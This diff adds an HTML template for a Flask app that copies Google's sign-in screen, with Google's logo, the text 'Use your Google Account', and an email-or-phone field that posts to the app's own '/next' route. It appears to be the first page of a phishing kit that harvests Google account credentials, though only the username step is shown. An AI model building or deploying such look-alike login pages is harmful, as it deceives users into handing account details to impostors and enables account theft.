@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    
+<div class="background-image"></div>
+  <style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
+
+</style>
+
+  
+    <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+      <title>Sign in</title>
+      <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+      <link rel="icon" type="image/png" href="{{ url_for('static', filename='icon.png') }}">
+   </head>
+    
+   <div class="login-box">
+     
+     <img src="{{ url_for('static', filename='google.jpg') }}">
+     
+     <h1>Sign in</h1>
+     <x1> Use your Google Account</x1>
+     <form method="post" action="/next">
+     <input type="username" id="username" name="username" placeHolder="Email or phone" required>
+     <br>
+     
+     <x2> Forgot email?</x2>
+     
+     <small>Not your computer? Use a private browsing window to sign<br> in.<span> Learn more<span></small>
+     
+     <x3> Create Account</x3>
+      
+    <button type="submit"> Next </button>
+    </form>
+    </div>
+
+
+  </body>
+</html>
